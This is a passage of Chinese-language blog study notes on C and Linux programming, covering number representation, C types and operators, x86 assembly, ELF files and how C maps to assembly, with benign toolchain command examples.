计算结果的最高位如果有进位则要加回到最低位上去.</p><p>取 1 的补码就是把每个位取反, 所以 1 的补码也被称为反码.</p><h3 id="13-3-3-2’s-Complement-表示法"><a href="#13-3-3-2’s-Complement-表示法" class="headerlink" title="13.3.3 2’s Complement 表示法"></a>13.3.3 2’s Complement 表示法</h3><p>2’s Complement 表示法规定: 正数不变, 负数先取反码再加 1.</p><p>意思是, 如果我想要表示 -4, 那我就要把 0100 拿出来, 取 0100 的 2 的补码, 即 1111 - 0100 + 1 &#x3D; 10000 - 0100. 即从 $2^4$ 里减去 4.</p><p>其计算规则为: 减法转换成加法, 忽略计算结果最高位的进位, 不必加回到最低位上去.</p><p>这里的精髓就是要舍弃最高位的进位.</p><h3 id="13-3-4-有符号数和无符号数"><a href="#13-3-4-有符号数和无符号数" class="headerlink" title="13.3.4 有符号数和无符号数"></a>13.3.4 有符号数和无符号数</h3><p>计算机做加法时并不区分操作数是有符号数还是无符号数, 计算过程都一样.</p><p>注意进位标志和溢出标志.</p><h2 id="13-4-浮点数"><a href="#13-4-浮点数" class="headerlink" title="13.4 浮点数"></a>13.4 浮点数</h2><p>浮点数在计算机中的表示是基于科学计数法 (Scientific Notation).</p><p>32767 这个数用科学计数法可以写成 $3.2767x10^4$, 3.2767 称为尾数  (Mantissa, 或着叫 Significand), 4 称为指数 (Exponent).</p><p>浮点数分为三个部分:</p><ul><li>符号位</li><li>指数部分</li><li>尾数部分, 这里要将所有有效位数都移到小数点后</li></ul><p>指数部分的表示采用 <mark>偏移的指数</mark> (Biased Exponent), 规定一个偏移值, 如 16, 实际的指数就要加上这个偏移值再写入到指数部分, 这样, 比 16 小就说明指数为负数, 比 16大就说明指数为正数.</p><p>为了解决每个浮点数的表示不唯一的问题, 规定尾数部分的最高位必须是一. 这个 1 不必保存在尾数中, 因为最高位都是 1.</p><p>做浮点运算时要注意精度损失问题. 有时计算顺序不同也会导致结果不同.</p><p>整数运算会产生溢出, 浮点运算也会产生溢出, 浮点运算的溢出也分上溢和下溢, 但和整数运算的定义不同.</p><h1 id="第14章-数据类型详解"><a href="#第14章-数据类型详解" class="headerlink" title="第14章 数据类型详解"></a>第14章 数据类型详解</h1><p>C 语言与平台和编译器是密不可分的.</p><p>ILP32 这个缩写的意思是 int (I), long (L), 和指针 (P) 类型都占 32位.</p><p>指针类型的长度总是和计算机的位数一直.</p><p>在 x86 平台上 int 和 long 的取值范围相同.</p><h2 id="14-2-浮点型"><a href="#14-2-浮点型" class="headerlink" title="14.2 浮点型"></a>14.2 浮点型</h2><p>浮点数的实现在各种平台上差异很大.</p><h2 id="14-3-类型转换"><a href="#14-3-类型转换" class="headerlink" title="14.3 类型转换"></a>14.3 类型转换</h2><h3 id="14-3-1-Integer-Promotion"><a href="#14-3-1-Integer-Promotion" class="headerlink" title="14.3.1 Integer Promotion"></a>14.3.1 Integer Promotion</h3><p>如果原始类型的取值范围都能用 int 型表示, 则其类型被提升为 int, 如果原始类型的取值范围用 int 型表示不了, 则提升为 unsigned int 型, 这被称作 Integer Promotion.</p><h3 id="14-3-2-Usual-Arithmetic-Conversion"><a href="#14-3-2-Usual-Arithmetic-Conversion" class="headerlink" title="14.3.2 Usual Arithmetic Conversion"></a>14.3.2 Usual Arithmetic Conversion</h3><p>两个算数类型的操作数做算数运算, 比如 a + b, 如果两边操作数的类型不同, 编译器会自动做类型转换, 使两边类型相同之后再做运算, 这被称为 Usual Arithmetic Conversion.</p><p>有符号数和无符号数混用会很麻烦.</p><h3 id="14-3-3-由赋值产生的类型转换"><a href="#14-3-3-由赋值产生的类型转换" class="headerlink" title="14.3.3 由赋值产生的类型转换"></a>14.3.3 由赋值产生的类型转换</h3><h3 id="14-3-4-强制类型转换"><a href="#14-3-4-强制类型转换" class="headerlink" title="14.3.4 强制类型转换"></a>14.3.4 强制类型转换</h3><h3 id="14-3-5-编译器如何处理类型转换"><a href="#14-3-5-编译器如何处理类型转换" class="headerlink" title="14.3.5 编译器如何处理类型转换"></a>14.3.5 编译器如何处理类型转换</h3><h1 id="第15章-运算符详解"><a href="#第15章-运算符详解" class="headerlink" title="第15章 运算符详解"></a>第15章 运算符详解</h1><h2 id="15-1-位运算"><a href="#15-1-位运算" class="headerlink" title="15.1 位运算"></a>15.1 位运算</h2><h3 id="15-1-1-按位与-或-异或-取反运算"><a href="#15-1-1-按位与-或-异或-取反运算" class="headerlink" title="15.1.1 按位与, 或, 异或, 取反运算"></a>15.1.1 按位与, 或, 异或, 取反运算</h3><p>&amp;, |, ^ 运算符都是要做 Usual Arithmetic Conversion 的 (其中有一步是 Integer Promotion), ~ 运算符也要做 Integer Promotion, 所以在 C 语言中其实并不存在 8 位整数的位运算, 操作数在做位运算之前都至少被提升为 int 型了.</p><h3 id="15-1-2-移位运算"><a href="#15-1-2-移位运算" class="headerlink" title="15.1.2 移位运算"></a>15.1.2 移位运算</h3><p>在一定的取值范围内, 将一个整数左移 1 位相当于乘以 2.</p><p>由于计算机做移位比乘法快得多, 编译器可以利用这一点进行优化.</p><p>当操作数是有符号数时, 右移运算的规则比较复杂.</p><p>建议只对无符号数做位运算, 以减少出错的可能性.</p><h3 id="15-1-3-掩码"><a href="#15-1-3-掩码" class="headerlink" title="15.1.3 掩码"></a>15.1.3 掩码</h3><p>用于对一个整数中的某些位进行操作.</p><h3 id="15-1-4-异或运算的一些特性"><a href="#15-1-4-异或运算的一些特性" class="headerlink" title="15.1.4 异或运算的一些特性"></a>15.1.4 异或运算的一些特性</h3><ul><li>一个数和自己做异或的结果是 0</li></ul><h2 id="15-2-其他运算符"><a href="#15-2-其他运算符" class="headerlink" title="15.2 其他运算符"></a>15.2 其他运算符</h2><p><code>a += 1</code> 和 <code>a = a + 1</code>, 前者对表达式 a 只求值一次, 而后者求值两次.</p><p><code>++i</code> 相当于 <code>i += 1</code>, 只求值一次.</p><h3 id="15-2-4-sizeof-运算符与-typedef-类型声明"><a href="#15-2-4-sizeof-运算符与-typedef-类型声明" class="headerlink" title="15.2.4 sizeof 运算符与 typedef 类型声明"></a>15.2.4 sizeof 运算符与 typedef 类型声明</h3><p><code>sizeof 表达式</code> 中的子表达式不求值, 如 <code>sizeof(i++)</code> 中 <code>i</code> 也不会递增.</p><p>sizeof 运算符的结果是 size_t 类型, 这个类型定义在 stddef.h 头文件中.</p><p>标准 C 规定 size_t 是一种无符号整型:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">size_t</span>;<br></code></pre></td></tr></table></figure><p>typedef 的例子:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> <span class="hljs-type">array_t</span>[<span class="hljs-number">10</span>];<br><span class="hljs-type">array_t</span> a;<br></code></pre></td></tr></table></figure><p>这相当于声明 <code>char a[10]</code>.</p><h1 id="第16章-计算机体系机构基础"><a href="#第16章-计算机体系机构基础" class="headerlink" title="第16章 计算机体系机构基础"></a>第16章 计算机体系机构基础</h1><p>Von Neumann 体系结构的主要特点: CPU (Central Processsing Unit, 中央处理器, 或简称处理器 Processor) 和内存 (Memory) 是计算机的两个主要组成部分, 内存中保存着数据和指令, CPU 从内存中取指令 (Fetch) 执行, 其中有些指令让 CPU 做运算, 有些指令让 CPU 读写内存中的数据.</p><p>一个地址所对应的内存单元只能存一个字节.</p><h2 id="16-2-CPU"><a href="#16-2-CPU" class="headerlink" title="16.2 CPU"></a>16.2 CPU</h2><p>CPU 最核心的功能单元包括以下几部分:</p><ul><li>寄存器 (Register)</li><li>程序计数器 (Program Counte), 是一种特殊的寄存器, 保存着 CPU 取下一条指令的地址.</li><li>指令译码器 (Intruction Decoder)</li><li>算数逻辑单元 (Arithmetic and Logic, ALU)</li><li>地址和数据总线 (Bus)</li></ul><p>地址线, 数据线和 CPU 寄存器的位数通常是一致的.</p><p>内总线经过 MMU 和总线接口的转换之后引出到芯片引脚才是外总线, 外地址线和外数据线的位数都有可能和内总线不同.</p><h2 id="16-3-设备"><a href="#16-3-设备" class="headerlink" title="16.3 设备"></a>16.3 设备</h2><p>正因为地址线和数据线上可以挂多个设备和内存芯片所以才叫 “总线”. 但不同设备和内存芯片应该占用不同的地址范围.</p><p>设备中可供读写访问的单元通常称为设备寄存器. 操作设备的过程就是读写这些设备寄存器的过程.</p><p>x86 对于设备有独立的端口地址空间, CPU 核需要引出额外的地址线来连接片内设备 (和访问内存所用的地址线不同).</p><p>从 CPU 的角度来看, 访问设备只有内存映射 I&#x2F;O 和端口 I&#x2F;O 两种.</p><p>一个操作系统为了支持广泛的设备就需要有大量的设备驱动程序, 事实上 Linux 内核源代码中绝大部分是设备驱动程序, 设备驱动程序通常是内核里的一组函数, 通过读写设备寄存器实现对设备的初始化, 读, 写等操作, 有些设备还要提供一个中断处理函数供 ISR 调用.</p><h2 id="16-4-MMU"><a href="#16-4-MMU" class="headerlink" title="16.4 MMU"></a>16.4 MMU</h2><h1 id="第17章-x86汇编程序基础"><a href="#第17章-x86汇编程序基础" class="headerlink" title="第17章 x86汇编程序基础"></a>第17章 x86汇编程序基础</h1><p>生成了目标文件之后还是无法执行, 虽然目标文件已经是二进制文件了.</p><p>链接主要有两个作用:</p><ul><li>修改目标文件中的信息, 对地址做重定位</li><li>把多个目标文件合并成一个可执行文件</li></ul><p><code>#</code> 表示单行注释.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.section .<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>汇编程序中以 <code>.</code> 开头的名称并不是指令的助记符, 不会被翻译成机器指令, 而是给汇编器一些特殊指示, 称为汇编指示 (Assembler Directive) 或伪操作 (Pseudo-operation), 由于它不是真正的指令所以加个 “伪” 字.</p><p><code>.section</code> 指示把代码划分成若干个段 (Section). 程序被操作系统加载时, 每个段被加载到不同的地址, 操作系统对不同的页面设置不同的读, 写, 执行权限. 感觉像是用来声明一个段.</p><p><code>.data</code> 段保存程序的数据, 是可读可写的, 相当于 C 程序的全局变量, 这里没有定义数据, 所以 <code>.data</code> 段是空的.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.section</span> <span class="hljs-string">.text</span><br></code></pre></td></tr></table></figure><p><code>.text</code> 段保存代码, 是只读和可执行的, 后面那些指令都是属于 <code>.text</code> 段.</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.globl _start</span><br></code></pre></td></tr></table></figure><p><code>_start</code> 是一个符号 (Symble), 符号在汇编程序中代表一个地址.</p><p>在 C 语言中我们通过变量名访问一个变量, 其实就是是读写从某个地址开始的内存单元, 我们通过函数名调用一个函数, 其实就是跳转到该函数第一条指令所在的地址, 所以变量名和函数名都是符号, 本质上是代表内存地址的.</p><p><code>.globl</code> 告诉汇编器, <code>_start</code> 这个符号要被链接器用到, 所以要在目标文件的符号表中标记它是一个全局符号.</p><p><code>_start</code> 就像 C 程序的 main 函数一样特殊, 是整个程序的入口, 这里只能是 <code>_start</code>, 不能写成其他的, 连接器在链接时会查找目标文件中 <code>_start</code> 符号代表的地址, 把它设置为整个程序的入口地址, 所以每个汇编程序都要提供一个 <code>_start</code>  符号并且用 <code>.globl</code> 声明, 如果一个符号没有用 <code>.global</code> 声明, 就表示这个符号不会被链接器用到.</p><p><code>_start:</code></p><p>这里定义了 <code>_start</code> 符号, 汇编器在翻译汇编程序时会计算每个数据对象和每条指令的地址, 当看到这样一个符号定义时, 就把他后面一条指令的地址作为这个符号所代表的地址.</p><p><code>movl $1, %eax</code></p><p>这条指令不要求 CPU 读内存, 1 这个数是在 CPU 内部产生的, 称为立即数 (Immediate).</p><p>在汇编程序中, 立即数前面要加 <code>$</code>, 寄存器名前面要加 <code>%</code>.</p><p>Linux 的各种系统调用都是由 <code>int $0x80</code> 指令引发的.</p><p><code>int</code> 指令称为软中断指令, 可以用这条指令故意产生一个异常, 异常的处理和中断类似, CPU 从用户模式切换为内核模式, 然后跳转到内和代码中执行异常处理程序.</p><p><code>int</code> 指令中的立即数 <code>0X80</code> 是一个参数, 在异常处理程序中要根据这个参数决定如何处理, 在 Linux 内核中 <code>int $0x80</code> 这种异常称为系统调用 (System Call).</p><p><code>eax</code> 和 <code>ebx</code> 是传递给系统调用的两个参数, <code>eax</code> 是系统调用号, <code>_exit</code> 的系统调用号是 1, <code>ebx</code> 的值是传递给 <code>_exit</code> 的参数.</p><p>UNIX 平台的汇编器一直使用 AT&amp;T 语法.</p><p><mark>参考书籍</mark> <a href="http://tldp.org/HOWTO/Assembly-HOWTO/">Linux Assembly HOWTO</a></p><h2 id="17-3-第二个汇编程序"><a href="#17-3-第二个汇编程序" class="headerlink" title="17.3 第二个汇编程序"></a>17.3 第二个汇编程序</h2><p>常用的数据声明:</p><ul><li><code>.long</code> 指示声明一组数, 每个数占 32 位</li><li><code>.byte</code> 指示声明一组数, 每个数占 8 位</li><li><code>ascii</code> 指示声明一组数, 每个数的取值为对应的 ASCII 码</li></ul><p><code>cmpl</code> 把两数相减来做比较, 不保留结果, 改变 eflags 寄存器中的标志位.</p><p><code>je</code> (jump if equal) 检查 eflags 中的 ZF 位来决定是否跳转.</p><p><code>jle</code> (jump if less than or equal).</p><h2 id="17-4-寻址方式"><a href="#17-4-寻址方式" class="headerlink" title="17.4 寻址方式"></a>17.4 寻址方式</h2><p>内存寻址在指令中可以表示成如下通用格式:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ADDRESS_OR_OFFSET</span><span class="hljs-params">(%BASE_OR_OFFSET,%INDEX,MULTIPLIER)</span></span><br></code></pre></td></tr></table></figure><p>它所表示的地址可以这样计算出来:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FINAL <span class="hljs-keyword">ADDRESS </span>= <span class="hljs-keyword">ADDRESS_OR_OFFSET </span>+ <span class="hljs-keyword">BASE_OR_OFFSET </span>+ <span class="hljs-keyword">MULTIPLIER </span>z INDEX<br></code></pre></td></tr></table></figure><p>其中 ADDRESS_OR_OFFSET 和 MULTIPLIER 必须是常数, BASE_OR_OFFSET 和 INDEX 必须是寄存器. 省略的项相当与是 0.</p><p>寻址方式见书.</p><h2 id="17-5-ELF-文件"><a href="#17-5-ELF-文件" class="headerlink" title="17.5 ELF 文件"></a>17.5 ELF 文件</h2><p>Excutable and Linkable Format.</p><p>各种 UNIX 系统的可执行文件都采用 ELF 格式, 它有以下三种不同的类型:</p><ul><li>可重定向的目标文件 (Relocatable 或 Object File)</li><li>可执行文件 (Excutable)</li><li>共享库 (Shared Object, 或者 Shared Library)</li></ul><p>链接器把 ELF 文件看成是 Section 的集合, 而加载器把 ELF 文件看成是 Segment 的集合.</p><p>Section Header Table 中保存了所有 Section 的描述信息. </p><p>Program Header Table 保存了所有 Segment 的描述信息.</p><p>Section Header Table 和 Program Header Table 并不一定位于文件的开头和结尾, 其位置由 ELF Header 指出.</p><p>目标文件需要链接器做进一步处理, 所以一定有 Section Header Table, 可执行文件需要家在进行, 所以一定有 Program Header Table, 共享库既要加载运行, 又要在加载时做动态链接, 所以既有 Section Header Table 又有 Program Header Table.</p><h3 id="17-5-1-目标文件"><a href="#17-5-1-目标文件" class="headerlink" title="17.5.1 目标文件"></a>17.5.1 目标文件</h3><p>可以用 <code>readelf</code> 工具读出目标文件的 ELF Header 和 Section Header Table.</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> readelf -a <span class="hljs-built_in">max</span>.o<br></code></pre></td></tr></table></figure><p>用 hexdump 命令打印目标文件的全部字节:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> hexdump -C <span class="hljs-built_in">max</span>.o<br></code></pre></td></tr></table></figure><p><code>.bss</code> 段中存放的是 C 语言中没有初始化的全局变量. 其在 ELF 文件中不占用空间.</p><p>在汇编程序中用 <code>.globl</code> 指示声明过的符号会成为全局符号, 否则成为局部符号.</p><p>objdump 工具可以把程序中的机器指令反汇编 (Disassemble):</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> objdump -d <span class="hljs-built_in">max</span>.o<br></code></pre></td></tr></table></figure><h3 id="17-5-2-可执行文件"><a href="#17-5-2-可执行文件" class="headerlink" title="17.5.2 可执行文件"></a>17.5.2 可执行文件</h3><p><code>.rel.text</code> 用于链接过程, 做完链接之后会被删掉.</p><p>x86 平台上后面的 PhysAddr 列是没有意义的, 并不代表实际的物理地址.</p><p>MMU 的权限保护机制是以页为单位, 一个页面只能设置一种权限.</p><p>为了简化链接器和加载器的实现, 还规定每个 Segment 在文件的页面中偏移多少加载到内存页面中也要偏移多少.</p><p>strip 命令可以去除可执行文件中的符号信息, 这样可以有效减小文件的尺寸而不影响运行:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> strip <span class="hljs-built_in">max</span><br></code></pre></td></tr></table></figure><p>不要对目标文件和共享库使用 strip 命令, 因为链接器需要利用目标文件和共享库中的符号信息来做链接.</p><h1 id="第18章-汇编与-C-之间的关系"><a href="#第18章-汇编与-C-之间的关系" class="headerlink" title="第18章 汇编与 C 之间的关系"></a>第18章 汇编与 C 之间的关系</h1><p>gcc 还提供了一种扩展语法可以在 C 程序中内嵌汇编指令.</p><h2 id="18-1-函数调用"><a href="#18-1-函数调用" class="headerlink" title="18.1 函数调用"></a>18.1 函数调用</h2><p>如果在编译时加上 <code>-g</code> 选项, 那么用 objdump 反汇编时可以把 C 代码和汇编代码穿插起来显示.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc main.c -g<br><span class="hljs-variable">$ </span>objdump -dS a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p>要查看编译后的汇编代码, 可以用 <code>gcc -S main.c</code> 这样只生成汇编代码 main.s, 而不生成二进制的目标文件.</p><p>在用 gdb 调试时, 可以用 disassemble 命令反汇编. 如果 disassemble 命令后面跟函数名或地址则反汇编指定的函数.</p><p>si 命令可以逐条指令 (应该是汇编指令) 进行单步调试. info registers 可以显示所有寄存器的当前值. 在 gdb 中表示寄存器名时前面要加 <code>$</code>, 如 <code>(gdb) p $esp</code>. <code>(gdb) x/20 $esp</code> 命令可以查看内存中从 0xbff1c3f4 地址开始的 20 个 32 位数.</p><p>在执行程序时, 操作系统为进程分配一块栈空间来保存函数栈帧, esp (Stack Pointer) 寄存器总是指向栈顶, 在 x86 平台上这个栈是从高地址向低地址增长的.</p><p>Linux 内核为每个新进程指定的栈空间的起始地址都会有些不同, 所以每次运行这个程序得到的地址都不一样.</p><p><mark>参数是从右向左依次压栈的.</mark> </p><p>这里栈指针每次减四是因为数据为 int 类型, 占四个字节.</p><p>在每个函数的栈帧中, <code>ebp</code> (Base Pointer) 指向栈底, <code>esp</code> 指向栈顶. 函数的参数和局部变量都是通过 <code>ebp</code> 的值加上一个偏移量来访问.</p><p>在 gdb 中可以用 bt 命令和 frame 命令查看每层栈帧上的参数和局部变量.</p><p>bar 函数有一个 int 型的返回值, 这个返回值是通过 eax 寄存器传递的.</p><h2 id="18-2-main-函数-启动例程和退出状态"><a href="#18-2-main-函数-启动例程和退出状态" class="headerlink" title="18.2 main 函数, 启动例程和退出状态"></a>18.2 main 函数, 启动例程和退出状态</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> -o <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p>这条命令实际可以分为三条命令来做:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ gcc -S <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> <br>$ gcc -c <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.s</span> <br>$ gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> <br></code></pre></td></tr></table></figure><p>使用 <code>-v</code> 选项可以了解详细的编译过程:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ gcc -v <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> -o main<br></code></pre></td></tr></table></figure><p>gcc 只是一个外壳而不是真正的编译器, 真正的 C 编译器是 <code>/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.0/cc1</code> (每个 Linux 版本的位置会有些许出入), gcc 调用 C 编译器, 汇编器和链接器完成 C 代码的编译链接工作.</p><p>查看编译器提供的目标文件里都有什么 (这里查看符号表):</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ nm <span class="hljs-regexp">/usr/</span>lib/crt1.o<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>readelf -s crt1.o<br></code></pre></td></tr></table></figure><p>符号表的每一行由地址, 符号类型和符号名组成.</p><p>符号类型用一个字母表示, 大写字母是全局符号, 小写字母是局部符号, 具体含义可查 <code>man 1 nm</code>.</p><p><code>T</code> 表示 Text, <code>U</code> 表示 Undefined.</p><p>C 程序的入口 表示 Undefined.</p><p>C 程序的入口其实是 <code>crt1.o</code> 提供的 <code>_start</code>, 它首先做一些初始化工作, 然后调用我们编写的 <code>main</code> 函数.</p><p>用反汇编来查看一下 <code>_start</code> 的定义:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ objdump -d <span class="hljs-regexp">/usr/</span>lib/crt1.o<br></code></pre></td></tr></table></figure><p>一个目标文件中引用了某个符号, 链接器在另一个目标文件中找到这个符号的定义并确定它的地址, 这个过程叫做 <mark>符号解析</mark> (Symble Resolution)</p><p>符号解析和重定位都是通过修改指令中的地址实现的,</p><p>链接器也是一种编辑器, 其编辑的是目标文件, 所以链接器叫做 Link Editor.</p><p>就是把其他目标文件链接到 <code>crt1.o</code> 中.</p><p>最后一个压栈的参数 <code>push $0x80483c4</code> 正是 main 函数的地址, <code>__libc_start_main</code> 在做完初始化工作之后会根据这个参数调用 main 函数.</p><p>由于 main 函数是被启动例程 (startup Route, 也就是 <code>_start</code>) 调用的, 所以从 main 函数 return 时就返回到启动例程中, main 函数的返回值就被启动例程得到, 如果将启动例程表示成等价的 C 代码 (实际上启动例程一般是直接用汇编语言编写的), 则它调用 main 函数的形式是: </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span>(main(argc, argv));<br></code></pre></td></tr></table></figure><p>也就是说, 启动例程得到 main 函数的返回值后, 会立即用它做参数调用 exit 函数.</p><p>使用 <code>exit</code> 函数要包含 <code>stdlib.h</code> 头文件.</p><h2 id="18-3-变量的存储布局"><a href="#18-3-变量的存储布局" class="headerlink" title="18.3 变量的存储布局"></a>18.3 变量的存储布局</h2><p>字符串字面值是只读, 相当于在全局作用域定义了一个 const 数组.</p><p>const 变量在定义时必须初始化, 因为只有在初始化时才有机会给它一个值.</p><p>链接器不会对局部符号做符号解析.</p><p>一个函数定义前面也可以用 static 修饰, 表示这个函数名是局部符号.</p><p>虽然栈是从高地址向低地址增长的, 但数组总是从低地址向高地址排列.</p><p><code>register</code> 关键词的作用就是, 指示编译器尽可能分配一个寄存器来保存这个变量.</p><p>C 语言中作用域的分类, 见书.</p><p>命名空间的分类 (部分):</p><ul><li>struct, enum, union 的 Tag 属于一个命名空间</li><li>struct 和 union 的成员名属于一个命名空间</li><li>其他所有标识符, 如变量名, 函数名, 宏定义, typedef 定义的类型名, enum 成员等都属于一个命名空间.</li></ul><p>链接属性.</p><p>存储类修饰符 (Storage Class Specifier):</p><ul><li>auto, 用它修饰的变量在函数调用时自动在栈上分配存储空间, 函数返回时自动释放, auto 可以省略不写, 且不能修饰文件作用域的变量.</li><li>register, 也不能修饰文件作用域的变量.</li><li>typedef, 其声明的看法如下, 先去掉 typedef 把它看成变量声明, 看这个变量是什么类型的, 则 typedef 就给什么类型起一个类型名</li></ul><p>typedef 的例子:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br></code></pre></td></tr></table></figure><p>先去掉 typedef, 就变成:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br></code></pre></td></tr></table></figure><p><code>buffer</code> 的类型是 <code>char [100]</code> 即长度为 100 的字符数组, 那么 <code>buffer</code> 就是长度为 100 的字符数组的别名.</p><p>变量生存期 (Storage Duration, 或者 Lifetime) 分为:</p><ul><li>静态生存期. 在程序开始执行时分配内存和初始化, 此后便一直存在直到程序结束, 通常位于 <code>.rodata</code>, <code>.data</code>, 或 <code>.bss</code> 段.</li><li>自动生存期</li><li>动态生存期</li></ul><h2 id="18-4-结构体和联合体"><a href="#18-4-结构体和联合体" class="headerlink" title="18.4 结构体和联合体"></a>18.4 结构体和联合体</h2><p>结构体的各成员并不是一个紧挨着一个排列的, 中间有空隙, 称为填充 (Padding). </p><p>大多数计算机体系结构对于访问内存的指令是有限制的, 在 32 位平台上, 如果一条指令访问 4 个字节, 起始内存地址应该是 4 的整数倍, 如果一条指令访问两个字节, 起始内存地址应该是 2 的整数倍, 这被称为对齐 (Alignment), 访问一个字节的指令没有对齐要求.</p><p>没有对齐可能会导致无法访问内存或效率更低.</p><p>要注意最后一个元素的填充. 其和第一个元素的需求相关. </p><p>合理设计结构体各成员的排列顺序可以节省存储空间.</p><p>一个联合体的各个成员占用相同的内存空间, 联合体的长度等于其中最长成员的长度.</p><p>联合体如果用 Initializer 初始化, 则只初始化它的第一个成员. 如</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">u = </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">513</span>, <span class="hljs-number">17</span>, <span class="hljs-number">129</span>, <span class="hljs-number">0</span>x<span class="hljs-number">81</span> &#125;&#125;</span><span class="language-xml"> ;</span><br></code></pre></td></tr></table></figure><p>使用 C99 的 Memberwise 初始化语法, 则可以初始化联合体的任意一个成员:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">demo_type</span> = &#123; .byte = &#123;<span class="hljs-number">0</span>x1b, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x24, <span class="hljs-number">0</span>x10, <span class="hljs-number">0</span>x81, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125; &#125;;<br></code></pre></td></tr></table></figure><p>ABI (Application Binary Interface), 应用程序二进制接口规范.</p><p>如果两个平台具有相同的体系结构, 并且遵循相同的 ABI, 就可以保证一个平台上的二进制程序直接复制到另一个平台就能运行.</p><h2 id="18-5-C-内联汇编"><a href="#18-5-C-内联汇编" class="headerlink" title="18.5 C 内联汇编"></a>18.5 C 内联汇编</h2><p>gcc 提供了一种扩展语法可以在 C 代码中使用内联汇编 (Inline Assembly). 最简单的格式:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__asm__</span>(<span class="hljs-string">&quot;assembly code&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>这里的 <code>__</code> 是两个下划线.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">__asm__(<span class="hljs-string">&quot;nop&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里 <code>nop</code> 让 CPU 空转一个指令执行周期.</p><p>执行多条汇编指令, 应该用 <code>\n\t</code> 将各条指令分割开:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">__asm_<span class="hljs-number">_</span>(<span class="hljs-string">&quot;movl $1, %eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $4, 